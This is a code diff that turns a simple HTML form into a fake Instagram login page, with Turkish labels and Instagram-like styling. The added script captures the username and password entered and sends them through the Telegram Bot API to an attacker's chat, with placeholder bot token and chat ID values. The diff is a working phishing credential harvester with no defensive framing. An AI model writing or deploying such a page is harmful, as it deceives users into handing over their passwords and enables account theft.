@@ -3,19 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Verileri</title>
+    <title>Instagram Giriş</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 300px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #2a88d1;
+        }
+
+        .footer {
+            margin-top: 10px;
+        }
+
+        .footer a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Telegram Verileri Gönder</h1>
-    <form id="dataForm">
-        <input type="text" id="dataInput" placeholder="Veri girin" required>
-        <button type="submit">Gönder</button>
-    </form>
+    <div class="container">
+        <h1>Instagram</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Kullanıcı adı veya e-posta" required>
+            <input type="password" id="password" placeholder="Şifre" required>
+            <button type="submit">Giriş Yap</button>
+        </form>
+        <div class="footer">
+            <a href="#">Şifrenizi mi unuttunuz?</a>
+        </div>
+    </div>
+
     <script>
-        document.getElementById('dataForm').addEventListener('submit', function(e) {
+        const chatId = 'CHAT_ID'; // Mesaj göndereceğiniz chat ID
+        const token = 'YOUR_BOT_TOKEN'; // Botunuzun API token’ı
+
+        function sendMessage(text) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Hata:', error));
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const data = document.getElementById('dataInput').value;
-            // Burada Telegram'a gönderme kodu gelecek
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const message = `Kullanıcı adı: ${username}, Şifre: ${password}`;
+            sendMessage(message);
         });
     </script>
 </body>
